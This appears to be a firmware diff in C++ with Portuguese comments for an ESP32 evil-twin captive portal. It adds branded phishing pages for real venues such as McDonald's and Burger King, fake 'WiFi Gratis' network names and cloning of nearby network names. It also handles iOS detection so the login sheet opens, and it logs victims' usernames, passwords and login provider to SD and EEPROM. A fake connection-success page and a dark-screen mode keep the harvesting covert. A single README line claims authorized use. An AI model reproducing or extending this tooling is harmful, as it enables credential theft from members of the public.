+    memcpy(s_pageNames[j + 1], k, CP_PAGE_NAME_LEN);
+  }
+
+  s_pageSourceCount = (uint8_t)(1 + n);
+  Serial.printf("[SD] %u pagina(s) no cartao\n", (unsigned)n);
+  for (uint8_t i = 0; i < n; i++) {
+    char p[56];
+    cpPagePathFor((uint8_t)(i + 1), p, sizeof(p));
+    Serial.printf("[SD]   SD %s  ->  %s\n", s_pageNames[i], p);
+  }
+}
+
+// Rotulo da fonte atual, usado no menu e no startAttack.
+static String cpPageSourceLabel() {
+  if (s_pageSourceIdx == 0 || s_pageSourceIdx >= s_pageSourceCount) return String("Local");
+  return String("SD ") + String(s_pageNames[s_pageSourceIdx - 1]);
+}
+
+// --- nome da rede ------------------------------------------------------------
+// Cada pagina tem um nome padrao: BK e McD tem os seus, as outras usam
+// "<pagina> WiFi Gratis" e a generica (Local) usa "WiFi Gratis".
+static bool cpEqNoCase(const char* a, const char* b) {
+  while (*a && *b) {
+    char ca = *a, cb = *b;
+    if (ca >= 'A' && ca <= 'Z') ca = (char)(ca + 32);
+    if (cb >= 'A' && cb <= 'Z') cb = (char)(cb + 32);
+    if (ca != cb) return false;
+    a++; b++;
+  }
+  return *a == '\0' && *b == '\0';
+}
+
+// Cria /captive_portal/ssid.txt na primeira vez, ja com uma linha por pagina
+// encontrada, para o usuario so precisar editar os valores.
+static void cpSeedSsidMap() {
+  if (!cpMountSD()) return;
+  if (SD.exists(kCpSsidMapPath)) return;
+
+  File f = SD.open(kCpSsidMapPath, "w");
+  if (!f) {
+    Serial.println("[SD] nao consegui criar ssid.txt");
+    return;
+  }
+  f.print("# Nome da rede Wi-Fi de cada pagina do portal\r\n");
+  f.print("# Formato:  <arquivo sem .html>=<nome da rede>\r\n");
+  f.print("# Edite a vontade. Linhas comecando com # sao ignoradas.\r\n");
+  f.print("# \"Local\" e a pagina generica embutida no firmware.\r\n");
+  f.print("\r\n");
+  f.printf("Local=%s\r\n", s_stdNameLocal);
+  for (uint8_t i = 0; i + 1 < s_pageSourceCount && i < CP_MAX_SD_PAGES; i++) {
+    f.printf("%s=%s WiFi Gratis\r\n", s_pageNames[i], s_pageNames[i]);
+  }
+  f.close();
+  Serial.println("[SD] criado /captive_portal/ssid.txt (edite os nomes)");
+}
+
+// Le o mapa do cartao. Sem o arquivo, vale o padrao embutido.
+static void cpLoadSsidMap() {
+  s_nameMapCount = 0;
+  snprintf(s_stdNameLocal, sizeof(s_stdNameLocal), "WiFi Gratis");
+
+  if (!cpMountSD()) return;
+  File f = SD.open(kCpSsidMapPath, FILE_READ);
+  if (!f) {
+    Serial.println("[SD] ssid.txt ausente: usando \"<pagina> WiFi Gratis\"");
+    return;
+  }
+
+  while (f.available()) {
+    String line = f.readStringUntil('\n');
+    line.trim();
+    if (line.length() == 0 || line[0] == '#') continue;
+
+    int eq = line.indexOf('=');
+    if (eq <= 0) continue;
+    String k = line.substring(0, eq);  k.trim();
+    String v = line.substring(eq + 1); v.trim();
+    if (k.length() == 0 || v.length() == 0) continue;
+
+    if (cpEqNoCase(k.c_str(), "Local")) {
+      v.toCharArray(s_stdNameLocal, sizeof(s_stdNameLocal));
+      continue;
+    }
+    if (s_nameMapCount >= CP_MAX_NAME_MAP) continue;
+    k.toCharArray(s_nameMap[s_nameMapCount].key, CP_PAGE_NAME_LEN);
+    v.toCharArray(s_nameMap[s_nameMapCount].ssid, CP_SSID_NAME_LEN);
+    s_nameMapCount++;
+  }
+  f.close();
+  Serial.printf("[SD] ssid.txt: Local=\"%s\" + %u pagina(s)\n",
+                s_stdNameLocal, (unsigned)s_nameMapCount);
+}
+
+// Nome padrao da pagina atual: vem do ssid.txt; se nao estiver la, deriva do arquivo.
+static void cpStdSsidForPage(char* out, size_t n) {
+  if (s_pageSourceIdx == 0 || s_pageSourceIdx >= s_pageSourceCount) {
+    snprintf(out, n, "%s", s_stdNameLocal);
+    return;
+  }
+  const char* nm = s_pageNames[s_pageSourceIdx - 1];
+  for (uint8_t i = 0; i < s_nameMapCount; i++) {
+    if (cpEqNoCase(s_nameMap[i].key, nm)) {
+      snprintf(out, n, "%s", s_nameMap[i].ssid);
+      return;
+    }
+  }
+  snprintf(out, n, "%s WiFi Gratis", nm);
+}
+
+static String cpEepromReadString(int addr, int maxLen) {
+  String s;
+  for (int i = 0; i < maxLen; i++) {
+    char c = (char)EEPROM.read(addr + i);
+    if (c == '\0') break;
+    s += c;
+  }
+  return s;
+}
+
+static void cpEepromWriteString(int addr, const String& s, int maxLen) {
+  for (int i = 0; i < maxLen; i++) {
+    EEPROM.write(addr + i, i < (int)s.length() ? (uint8_t)s[i] : 0);
+  }
+}
+
+// Coloca em custom_ssid o nome da origem escolhida (Std / Custom / Clone).
+static void cpApplySsidSource(bool persist) {
+  char stdName[48];
+  cpStdSsidForPage(stdName, sizeof(stdName));
+
+  String s;
+  if (s_ssidSrc == 1)      s = cpEepromReadString(CUSTOM_SSID_ADDR, 32);
+  else if (s_ssidSrc == 2) s = cpEepromReadString(CLONE_SSID_ADDR, 32);
+  if (s.length() == 0)     s = String(stdName);
+  if (s.length() == 0)     s = String(default_ssid);
+  if (s.length() > 31)     s = s.substring(0, 31);
+
+  s.toCharArray(custom_ssid, 32);
+  if (persist) {
+    cpEepromWriteString(SSID_ADDR, s, 32);
+    EEPROM.commit();
+  }
+}
+
+static const char kCpReadmeText[] = R"RDME(ESP32-DIV - Captive Portal: paginas por local
+=========================================================
+
+COMO FUNCIONA
+-------------
+O firmware traz UMA pagina generica de "Wi-Fi Gratis" embutida (a opcao
+"Local"). As paginas personalizadas de cada lugar ficam no cartao SD.
+
+O NOME DO ARQUIVO E O NOME DO LOCAL no menu. Exemplos:
+
+  /captive_portal/McD.html   -> aparece como "SD McD"
+  /captive_portal/BK.html    -> aparece como "SD BK"
+  /captive_portal/Cafe.html  -> aparece como "SD Cafe"
+
+O menu "Page" cicla entre "Local" e cada .html que encontrar na pasta
+(ate 8). A escolha fica salva no EEPROM. Se o cartao faltar, ou o arquivo
+nao existir, o firmware cai na pagina generica - o portal nunca fica sem
+pagina.
+
+Use nomes CURTOS (McD, BK, Cafe): o menu do aparelho tem pouca largura.
+
+ARQUIVOS
+--------
+  /captive_portal/<local>.html   uma pagina por local (ex.: McD.html, BK.html)
+  /captive_portal/ssid.txt       nome da rede Wi-Fi de cada pagina
+  /captive_portal/README.txt     este arquivo
+
+NOME DA REDE (ssid.txt)
+-----------------------
+O nome padrao do Wi-Fi de cada pagina fica em /captive_portal/ssid.txt,
+uma linha por pagina, no formato <arquivo sem .html>=<nome da rede>:
+
+    Local=WiFi Gratis
+    McD=McD WiFi Gratis
+    BK=BK WiFi Gratis
+    Madero=Madero WiFi Gratis
+
+- "Local" e a pagina generica embutida no firmware.
+- Pagina que nao estiver no arquivo usa "<nome do arquivo> WiFi Gratis".
+- Linhas comecando com # sao ignoradas.
+- Se o arquivo faltar, o firmware cria um modelo na primeira vez.
+- Para mudar o nome no aparelho sem editar o cartao, use Config > SSID Custom.
+
+Todas as paginas tem a MESMA ESTRUTURA (as 9 telas, os 5 botoes de login,
+os termos, o botao voltar, as validacoes). O que muda por local e so a
+identidade: paleta, fonte, logotipos e os textos que citam o lugar.
+
+COMO ADICIONAR UM LOCAL
+-----------------------
+1. Copie uma das paginas (ex.: BK.html) para /captive_portal/Cafe.html
+2. Abra no PC e troque as cores, a fonte e os logotipos
+3. Salve, recoloque o cartao e ligue o aparelho
+Nao precisa recompilar nada.
 
 CONTRATO OBRIGATORIO (para os dados digitados serem registrados)
-----------------------------------------------------------------
-O firmware so captura o que for enviado EXATAMENTE assim:
-
-  1. Formulario que faz POST para /login :
+---------------------------------------------------------------
+ 1. Formulario que faz POST para /login :
         <form action='/login' method='POST'> ... </form>
-  2. Campo de senha com name="password" :
+ 2. Campo de senha com name="password" :
         <input type='password' name='password'>
-  3. (Opcional) campo de usuario com name="username" :
-        <input type='text' name='username'>
-  4. Um submit dentro do form:
-        <button type='submit'>Entrar</button>
+ 3. Campo de usuario com name="username" (oculto ou visivel)
+ 4. Campo name="provider" com o nome do botao (google/facebook/...)
+ 5. Um submit dentro do form
 
-Se voce renomear os campos (ex.: name='senha') ou mudar o action, o dado
-NAO sera registrado. Os nomes username/password e o action /login sao fixos
-no firmware.
+Se renomear os campos ou mudar o action, o dado NAO sera registrado.
 
 ONDE OS DADOS FICAM
 -------------------
 Cada envio e gravado em:
   /captive_portal/captured.csv
-Colunas: millis,remote_ip,ssid,username,password
-(Tambem salvos na EEPROM, exportaveis pela tela do aparelho.)
+Colunas: millis,provider,remote_ip,ssid,username,password
 
-EXEMPLO MINIMO QUE FUNCIONA
----------------------------
-  <!DOCTYPE html><html><head><meta name='viewport'
-    content='width=device-width, initial-scale=1'></head><body>
-    <h1>Minha pagina</h1>
-    <form action='/login' method='POST'>
-      <input type='text' name='username' placeholder='Usuario'><br>
-      <input type='password' name='password' placeholder='Senha' required><br>
-      <button type='submit'>Entrar</button>
-    </form>
-  </body></html>
+E tambem no EEPROM do aparelho (20 ultimas), exportaveis pelo menu
+"Export" para /captive_portal/eeprom_dump.csv.
 
 USO AUTORIZADO
 --------------
@@ -3417,7 +4516,7 @@ Apenas em laboratorio/equipamentos proprios ou com autorizacao explicita,
 para estudo e defesa. Nao use contra terceiros.
 )RDME";
 
-static bool cpWriteFileIfMissing(const char* path, const String& content) {
+static bool cpWriteFileIfMissing(const char* path, const char* content) {
   if (!cpMountSD()) return false;
   if (SD.exists(path)) return true;          // never overwrite the user's edits
   File f = SD.open(path, "w");
@@ -3433,39 +4532,43 @@ static bool cpWriteFileIfMissing(const char* path, const String& content) {
   return true;
 }
 
-// Seed login.html (with the current built-in page) and README.txt on first run.
+// Cria o LEIA-ME no cartao (primeira vez) e conta as paginas local_N.html.
 static void cpSeedPortalFilesOnSD() {
   if (!cpEnsureDir("/captive_portal")) {
     Serial.println("[SD] /captive_portal unavailable; built-in portal page");
     return;
   }
-  if (cpWriteFileIfMissing(kCpPagePath, loginPage)) {
-    Serial.printf("[SD] editable portal page at %s\n", kCpPagePath);
-  }
-  cpWriteFileIfMissing(kCpReadmePath, String(kCpReadmeText));
+  // A pagina embutida vive no firmware; aqui so criamos o LEIA-ME.
+  cpWriteFileIfMissing(kCpReadmePath, kCpReadmeText);
+  cpScanSDPages();
 }
 
-// Load the (possibly user-edited) page from SD into loginPage; fall back to the
-// built-in default on any problem.
-static void cpLoadLoginPageFromSD() {
-  if (!cpMountSD())            { Serial.println("[SD] not mounted; built-in portal page"); return; }
-  if (!SD.exists(kCpPagePath)) { Serial.println("[SD] login.html missing; built-in portal page"); return; }
-  File f = SD.open(kCpPagePath, FILE_READ);
-  if (!f)                      { Serial.println("[SD] cannot open login.html; built-in portal page"); return; }
+// --- servir a pagina do portal ----------------------------------------------
+// A pagina embutida vai direto da flash (send_P), sem copia na RAM; a versao
+// do SD e enviada em streaming. Sem isso, ~56 KB de heap ficavam presos e o
+// lwIP/WiFi nao tinha folga para os buffers de pacote - o celular conectava e
+// a pagina nao carregava.
+static void cpLogHeap(const char* where) {
+  Serial.printf("[heap] %-26s livre=%u  maior_bloco=%u\n",
+                where, (unsigned)ESP.getFreeHeap(), (unsigned)ESP.getMaxAllocHeap());
+}
 
-  String html;
-  html.reserve(f.size() + 1);
-  while (f.available()) html += (char)f.read();
-  f.close();
-
-  if (html.length() < 20) {    // too small to be a real page -> keep default
-    Serial.println("[SD] login.html empty/too small; built-in portal page");
-    return;
+static void cpSendPortalPage() {
+  if (s_pageSourceIdx > 0 && s_pageSourceIdx < s_pageSourceCount) {
+    char p[48];
+    cpPagePathFor(s_pageSourceIdx, p, sizeof(p));
+    if (cpMountSD() && SD.exists(p)) {
+      File f = SD.open(p, FILE_READ);
+      if (f) {
+        Serial.printf("[portal] %s em streaming (%u bytes)\n", p, (unsigned)f.size());
+        server.streamFile(f, "text/html");
+        f.close();
+        return;
+      }
+    }
+    Serial.printf("[portal] %s indisponivel; usando a pagina Local\n", p);
   }
-  loginPage = html;
-  Serial.printf("[SD] loaded portal page from %s (%u bytes)\n",
-                kCpPagePath, (unsigned)loginPage.length());
-  displayPrint("Portal page loaded from SD", GREEN, false);
+  server.send_P(200, "text/html", kBuiltinLoginPage);
 }
 
 static bool cpDumpAllCredentialsToSD(int* outCount) {
@@ -3486,13 +4589,15 @@ static bool cpDumpAllCredentialsToSD(int* outCount) {
     if (!f) return false;
   }
 
-  f.print("index,ssid,username,password\r\n");
+  f.print("index,provider,ssid,username,password\r\n");
   for (int i = 0; i < count; i++) {
     Credential cred;
     EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
     String line;
-    line.reserve(16 + strlen(cred.ssid) + strlen(cred.username) + strlen(cred.password));
+    line.reserve(48 + strlen(cred.ssid) + strlen(cred.username) + strlen(cred.password));
     line += String(i);
+    line += ",";
+    line += cpCsvEscape(String(cred.provider));
     line += ",";
     line += cpCsvEscape(String(cred.ssid));
     line += ",";
@@ -3572,13 +4677,16 @@ static void handleGenerate204() {
 static void handleHotspotDetect() {
   Serial.println("iOS /hotspot-detect.html requested");
   displayPrint("iOS /hotspot-detect.html requested", GREEN, false);
-  server.send(200, "text/html", loginPage);
+  // Resposta diferente de "Success" faz o iOS abrir a folha do captive portal.
+  cpSendPortalPage();
 }
 
 static void handleCaptiveApple() {
   Serial.println("iOS /captive.apple.com requested");
   displayPrint("iOS /captive.apple.com requested", GREEN, false);
-  server.send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
+  // NAO responder "Success" aqui: essa string diz ao iOS "a internet funciona",
+  // e ele entao nao mostra a pagina do portal. Servimos a pagina do portal.
+  cpSendPortalPage();
 }
 
 static void handleNCSITxt() {
@@ -3596,30 +4704,34 @@ static void handleConnectTestTxt() {
 static void handleLoginPage() {
   Serial.println("Login page (/login.html) requested");
   displayPrint("Login page (/login.html) requested", GREEN, false);
-  server.send(200, "text/html", loginPage);
+  cpSendPortalPage();
 }
 
 static void handleRoot() {
   Serial.println("Root (/) requested");
   displayPrint("Root (/) requested", GREEN, false);
-  server.send(200, "text/html", loginPage);
+  cpSendPortalPage();
 }
 
 static void handleLoginPost() {
   String username = server.arg("username");
   String password = server.arg("password");
+  String provider = server.arg("provider");
+  provider.trim();
+  if (provider.length() == 0) provider = "desconhecido";
   String remoteIp = server.client().remoteIP().toString();
   Serial.println("Captured Credentials:");
+  Serial.println("Provider: " + provider);
   Serial.println("Username: " + username);
   Serial.println("Password: " + password);
   Serial.println("SSID: " + String(custom_ssid));
-  saveCredential(username, password, custom_ssid);
-  if (cpAppendCaptureToSD(remoteIp, username, password, String(custom_ssid))) {
+  saveCredential(username, password, custom_ssid, provider);
+  if (cpAppendCaptureToSD(remoteIp, username, password, String(custom_ssid), provider)) {
     Serial.println("[SD] Captive capture appended to /captive_portal/captured.csv");
   } else {
     Serial.println("[SD] Captive capture export failed (SD not mounted / write error)");
   }
-  server.send(200, "text/html", "<h1>Login Successful!</h1><p>You are now connected.</p>");
+  server.send(200, "text/html", "<!DOCTYPE html><html lang='pt-BR'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'><title>Conectado - McWi-Fi</title><style>body{font-family:Arial,sans-serif;background:#F8F0E7;color:#27251F;text-align:center;padding:40px 20px}h1{color:#DA291C}</style></head><body><h1>Conectado!</h1><p>Você está conectado ao McWi-Fi. Aproveite a internet.</p></body></html>");
 }
 
 static void handleNotFound() {
@@ -4093,7 +5205,11 @@ static void cpCloneExistingAPFlow() {
   }
 
   ap_channel = (ch == 0 ? 1 : ch);
-  saveSSID(chosen);
+  cpEepromWriteString(CLONE_SSID_ADDR, chosen, 32);
+  s_ssidSrc = 2;
+  EEPROM.write(SSID_SRC_ADDR, s_ssidSrc);
+  EEPROM.commit();
+  cpApplySsidSource(true);
   Serial.printf("[CP] Cloned AP: SSID='%s' CH=%u\n", custom_ssid, (unsigned)ap_channel);
 
   memset(&cp_target_ap, 0, sizeof(cp_target_ap));
@@ -4125,12 +5241,18 @@ static void cpEditSsid() {
   cfg.requireNonEmpty = true;
   cfg.emptyErrorMsg   = "SSID cannot be empty!";
 
+  inputSSID = cpEepromReadString(CUSTOM_SSID_ADDR, 32);   // comeca com o ultimo nome
   OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, inputSSID);
   if (r.accepted && r.text.length() > 0) {
     inputSSID = r.text;
-    saveSSID(inputSSID);
+    cpEepromWriteString(CUSTOM_SSID_ADDR, inputSSID, 32);
+    s_ssidSrc = 1;
+    EEPROM.write(SSID_SRC_ADDR, s_ssidSrc);
+    EEPROM.commit();
+    cpApplySsidSource(true);
+    Serial.printf("[portal] nome: Custom -> %s\n", custom_ssid);
   }
-  drawMainMenu();
+  drawConfigMenu();
 }
 
 void drawMainMenu() {
@@ -4144,6 +5266,7 @@ void drawMainMenu() {
   displayPrint(custom_ssid, WHITE, false);
   displayPrint("...", UI_TEXT, false);
 
+  displayPrint("Page: " + cpPageSourceLabel(), UI_TEXT, false);
   displayPrint("Channel: " + String(ap_channel), UI_TEXT, false);
   displayPrint(attackActive ? "Status: Active" : "Status: Inactive", UI_TEXT, false);
   if (cp_deauth_active) {
@@ -4183,22 +5306,28 @@ void drawCredList() {
     for (int i = startIdx; i < min(count, startIdx + kCredRowsPerPage); i++) {
       Credential cred;
       EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
-      Serial.printf("Credential %d at address %d: User=%s, Pass=%s, SSID=%s\n",
-                    i, CRED_ADDR + (i * CRED_SIZE), cred.username, cred.password, cred.ssid);
+      Serial.printf("Credential %d at address %d: User=%s, Pass=%s, SSID=%s, Provider=%s\n",
+                    i, CRED_ADDR + (i * CRED_SIZE), cred.username, cred.password, cred.ssid,
+                    cred.provider);
 
       tft.setTextColor(WHITE, TFT_BLACK);
       tft.setCursor(0, yOffset);
-      tft.println(cred.username);
+      tft.print(cred.username);
       tft.setCursor(80, yOffset);
-      tft.println(cred.password);
+      tft.print(cred.password);
       tft.setCursor(160, yOffset);
-      tft.println(cred.ssid);
+      tft.print(cred.ssid);
 
       tft.setTextColor(UI_WARN, TFT_BLACK);
-      tft.setCursor(223, yOffset - 1);
-      tft.println("X");
+      tft.setCursor(225, yOffset - 1);
+      tft.print("X");
 
-      yOffset += 10;
+      // segunda linha: por qual botao o login foi feito
+      tft.setTextColor(UI_ACCENT, TFT_BLACK);
+      tft.setCursor(0, yOffset + 9);
+      tft.print(cred.provider);
+
+      yOffset += kCredRowH;
     }
   }
 
@@ -4258,8 +5387,10 @@ void stopAttack() {
 
 void startAttack() {
   if (!attackActive) {
+    cpLogHeap("antes do softAP");
     WiFi.mode(WIFI_AP);
     WiFi.softAP(custom_ssid, password, ap_channel);
+    cpLogHeap("depois do softAP");
     Serial.println("Access Point started");
     Serial.print("IP Address: ");
     Serial.println(WiFi.softAPIP());
@@ -4268,11 +5399,13 @@ void startAttack() {
 
     dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
     dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+    cpLogHeap("depois do DNS");
     Serial.println("DNS server started");
     displayPrint("DNS server started", GREEN, false);
 
     setupWebServer();
     server.begin();
+    cpLogHeap("depois do web server");
     Serial.println("Web server started");
     displayPrint("Web server started", GREEN, false);
 
@@ -4292,16 +5425,16 @@ void handleMainMenu(int x, int y) {
 void handleCredList(int x, int y) {
   int count = EEPROM.read(COUNT_ADDR);
   int startIdx = credPage * kCredRowsPerPage;
-  int yOffset = 80;
+  int yOffset = 90;
 
   for (int i = startIdx; i < min(count, startIdx + kCredRowsPerPage); i++) {
-    if (x >= 220 && x <= 230 && y >= yOffset - 3 && y <= yOffset + 7) {
+    if (x >= 218 && x <= 238 && y >= yOffset - 3 && y <= yOffset + 15) {
       Serial.println("Delete button pressed for credential " + String(i));
       deleteCredential(i);
       drawCredList();
       return;
     }
-    yOffset += 10;
+    yOffset += kCredRowH;
   }
 
   if (featureHasTouchNavBar()) {
@@ -4401,7 +5534,8 @@ void runUI() {
     case 3:
       switch (activeIcon) {
         case 0:
-          cpEditSsid();
+          currentScreen = CONFIG_MENU;
+          drawConfigMenu();
           animationState = 0;
           activeIcon = -1;
           break;
@@ -4489,14 +5623,102 @@ static void cportalUpdateNavLabels() {
                       s_clonePickMode ? "Pick" : nullptr);
   } else if (currentScreen == CRED_LIST) {
     setTouchNavLabels("Back", nullptr, "Clear", nullptr, "Export");
+  } else if (currentScreen == CONFIG_MENU) {
+    setTouchNavLabels("Back", "Down", "OK", "Up", nullptr);
   } else {
-    setTouchNavLabels("Back", "Clone",
-                      attackActive ? "Stop" : "Start", "SSID", "Creds");
+    // ESQUERDA=Volta | BAIXO=Credenciais | SELECT=Start/Stop | DIREITA=Config
+    setTouchNavLabels("Back", "Creds",
+                      attackActive ? "Stop" : "Start", "Sleep", "Config");
   }
   redrawTouchButtonBar();
 }
 
+// --- economia de bateria: desligar a tela -----------------------------------
+// CIMA apaga a tela DE VERDADE: backlight em 0 (nao e "brilho minimo") e o
+// painel recebe DISPOFF. Nesse estado SOMENTE o CIMA responde - os outros
+// botoes sao lidos e descartados. O captive portal continua atendendo os
+// clientes normalmente (DNS + HTTP seguem rodando).
+// O LED de status (NeoPixel no GPIO 1) pisca a cada 5 s para mostrar que o
+// aparelho esta vivo.
+static bool     s_sleeping       = false;
+static bool     s_sleepLedOn     = false;
+static uint32_t s_sleepLastBlink = 0;
+
+static const uint32_t CP_SLEEP_BLINK_MS  = 5000;   // pisca a cada 5 s
+static const uint32_t CP_SLEEP_LED_ON_MS = 130;    // duracao do pisca
+static const uint8_t  CP_SLEEP_LED_R     = 0;
+static const uint8_t  CP_SLEEP_LED_G     = 0;
+static const uint8_t  CP_SLEEP_LED_B     = 48;
+
+static void cpSleepLed(bool on) {
+#if NEOPIXEL_PIN >= 0
+  if (on) neopixelWrite(NEOPIXEL_PIN, CP_SLEEP_LED_R, CP_SLEEP_LED_G, CP_SLEEP_LED_B);
+  else    neopixelWrite(NEOPIXEL_PIN, 0, 0, 0);
+#else
+  (void)on;
+#endif
+}
+
+static void cpSleepEnter() {
+  if (s_sleeping) return;
+  s_sleeping       = true;
+  s_sleepLedOn     = true;             // primeiro pisca imediato
+  s_sleepLastBlink = millis();
+
+  // Desliga de verdade: backlight sem PWM (pino em LOW) + painel em sleep.
+  screenPowerOff();
+  cpSleepLed(true);
+
+  Serial.printf("[portal] tela DESLIGADA (configurado=%u). CIMA acorda.\n",
+                (unsigned)settings().brightness);
+}
+
+static void cpSleepWake() {
+  if (!s_sleeping) return;
+  s_sleeping   = false;
+  s_sleepLedOn = false;
+  cpSleepLed(false);
+
+  // Devolve o brilho que o usuario configurou (o helper garante que nunca
+  // volta com brilho 0).
+  uint8_t b = settings().brightness;
+  if (b < BKL_LEVEL_MIN) b = BKL_LEVEL_MED;
+  screenPowerOn(b);
+  Serial.printf("[portal] tela LIGADA (backlight=%u).\n", (unsigned)b);
+
+  // Redesenha a tela em que o usuario estava.
+  switch (currentScreen) {
+    case CRED_LIST:   drawCredList();   break;
+    case CONFIG_MENU: drawConfigMenu(); break;
+    default:          drawMainMenu();   break;
+  }
+  redrawTouchButtonBar();
+}
+
+// Chamado a cada volta do loop enquanto a tela esta apagada.
+static void cpSleepTick() {
+  const uint32_t now = millis();
+  if (s_sleepLedOn) {
+    if (now - s_sleepLastBlink >= CP_SLEEP_LED_ON_MS) {
+      cpSleepLed(false);
+      s_sleepLedOn = false;
+    }
+  } else if (now - s_sleepLastBlink >= CP_SLEEP_BLINK_MS) {
+    cpSleepLed(true);
+    s_sleepLedOn     = true;
+    s_sleepLastBlink = now;
+  }
+}
+
 static void cportalTeardown() {
+  // Se sair do portal com a tela apagada, devolve a tela ao usuario.
+  if (s_sleeping) {
+    s_sleeping = false;
+    cpSleepLed(false);
+    uint8_t b = settings().brightness;
+    if (b < BKL_LEVEL_MIN) b = BKL_LEVEL_MED;
+    screenPowerOn(b);
+  }
   stopAttack();
   cpStopDeauth();
   esp_wifi_set_promiscuous(false);
@@ -4512,28 +5734,33 @@ static void cportalHandleMainNavButtons() {
   }
 
   if (isButtonPressedEdge(BTN_LEFT)) {
+    // ESQUERDA = volta (sai do Captive Portal)
     cportalTeardown();
     feature_exit_requested = true;
     return;
   }
+  if (isButtonPressedEdge(BTN_RIGHT)) {
+    // DIREITA = Configuracao
+    currentScreen = CONFIG_MENU;
+    drawConfigMenu();
+    cportalLastBtnMs = now;
+    cportalWaitButtonRelease(BTN_RIGHT);
+    return;
+  }
   if (isButtonPressedEdge(BTN_DOWN)) {
-    cpCloneExistingAPFlow();
+    // BAIXO = Credenciais
+    currentScreen = CRED_LIST;
+    credPage = 0;
+    drawCredList();
     cportalLastBtnMs = now;
     cportalWaitButtonRelease(BTN_DOWN);
     return;
   }
   if (isButtonPressedEdge(BTN_UP)) {
-    cpEditSsid();
+    // CIMA = apagar a tela (economia de bateria)
+    cpSleepEnter();
     cportalLastBtnMs = now;
     cportalWaitButtonRelease(BTN_UP);
-    return;
-  }
-  if (isButtonPressedEdge(BTN_RIGHT)) {
-    currentScreen = CRED_LIST;
-    credPage = 0;
-    drawCredList();
-    cportalLastBtnMs = now;
-    cportalWaitButtonRelease(BTN_RIGHT);
     return;
   }
   if (isButtonPressedEdge(BTN_SELECT)) {
@@ -4582,6 +5809,111 @@ static void cportalHandleCredNavButtons() {
   }
 }
 
+static void drawConfigMenu() {
+  currentScreen = CONFIG_MENU;
+  cportalUpdateNavLabels();
+  wifiClearBody(TFT_BLACK);
+  tft.setTextSize(1);
+
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(8, 40);
+  tft.println("Config");
+
+  // Ordem pedida: Page | SSID Std | SSID Custom | SSID Clone
+  const char* labels[4] = { "Page", "SSID Std", "SSID Custom", "SSID Clone" };
+  for (int i = 0; i < 4; i++) {
+    int y = 62 + i * 21;
+    bool sel = (i == s_configSel);
+    tft.setCursor(8, y);
+    tft.setTextColor(sel ? ORANGE : WHITE, TFT_BLACK);
+    tft.print(sel ? "> " : "  ");
+    // "*" marca qual das tres origens esta em uso
+    tft.print((i >= 1 && s_ssidSrc == (uint8_t)(i - 1)) ? "*" : " ");
+    tft.print(labels[i]);
+
+    String val;
+    if (i == 0) {
+      val = cpPageSourceLabel();
+    } else if (i == 1) {
+      char b[48];
+      cpStdSsidForPage(b, sizeof(b));
+      val = b;
+    } else if (i == 2) {
+      val = cpEepromReadString(CUSTOM_SSID_ADDR, 32);
+    } else {
+      val = cpEepromReadString(CLONE_SSID_ADDR, 32);
+    }
+    if (val.length() == 0) val = "-";
+    if (val.length() > 17) val = val.substring(0, 16) + "~";
+
+    tft.setTextColor(sel ? ORANGE : UI_WARN, TFT_BLACK);
+    tft.setCursor(112, y);
+    tft.print(val);
+  }
+
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(8, 152);
+  tft.print("* = nome em uso");
+}
+
+static void cportalHandleConfigNavButtons() {
+  if (currentScreen != CONFIG_MENU) {
+    return;
+  }
+  const uint32_t now = millis();
+  if (now - cportalLastBtnMs < cportalDebounceMs) {
+    return;
+  }
+  if (isButtonPressedEdge(BTN_LEFT)) {
+    currentScreen = MAIN_MENU;
+    drawMainMenu();
+    cportalLastBtnMs = now;
+    cportalWaitButtonRelease(BTN_LEFT);
+    return;
+  }
+  if (isButtonPressedEdge(BTN_UP)) {
+    if (s_configSel > 0) s_configSel--;
+    drawConfigMenu();
+    cportalLastBtnMs = now;
+    cportalWaitButtonRelease(BTN_UP);
+    return;
+  }
+  if (isButtonPressedEdge(BTN_DOWN)) {
+    if (s_configSel < 3) s_configSel++;
+    drawConfigMenu();
+    cportalLastBtnMs = now;
+    cportalWaitButtonRelease(BTN_DOWN);
+    return;
+  }
+  if (isButtonPressedEdge(BTN_SELECT)) {
+    if (s_configSel == 0) {
+      // Page: cicla Local -> SD <nome> -> ... -> Local
+      s_pageSourceIdx++;
+      if (s_pageSourceIdx >= s_pageSourceCount) s_pageSourceIdx = 0;
+      EEPROM.write(CP_SOURCE_ADDR, s_pageSourceIdx);
+      EEPROM.commit();
+      Serial.printf("[portal] pagina: %s\n", cpPageSourceLabel().c_str());
+      // o nome padrao acompanha a pagina escolhida
+      if (s_ssidSrc == 0) cpApplySsidSource(true);
+      drawConfigMenu();
+    } else if (s_configSel == 1) {
+      // usar o nome padrao da pagina
+      s_ssidSrc = 0;
+      EEPROM.write(SSID_SRC_ADDR, s_ssidSrc);
+      EEPROM.commit();
+      cpApplySsidSource(true);
+      Serial.printf("[portal] nome: Std -> %s\n", custom_ssid);
+      drawConfigMenu();
+    } else if (s_configSel == 2) {
+      cpEditSsid();            // escreve o nome; ja aplica e redesenha
+    } else {
+      cpCloneExistingAPFlow(); // clona de uma rede proxima; ja aplica e redesenha
+    }
+    cportalLastBtnMs = now;
+    cportalWaitButtonRelease(BTN_SELECT);
+  }
+}
+
 void cportalSetup() {
   pauseBackgroundRadioTasks();
   setTouchButtonInputEnabled(true);
@@ -4604,11 +5936,24 @@ void cportalSetup() {
   }
   loadSSID();
 
-  // Seed (first run) + load the SD-editable login page; falls back to built-in.
-  cpSeedPortalFilesOnSD();
-  cpLoadLoginPageFromSD();
+  // Fonte da pagina: Local (embutida) ou uma das local_N.html do cartao.
+  cpSeedPortalFilesOnSD();   // pasta + README + varredura das paginas
+  cpSeedSsidMap();           // cria o ssid.txt se faltar
+  cpLoadSsidMap();           // le a relacao pagina -> nome da rede
 
-  startAttack();
+  s_pageSourceIdx = EEPROM.read(CP_SOURCE_ADDR);
+  if (s_pageSourceIdx >= s_pageSourceCount) s_pageSourceIdx = 0;
+
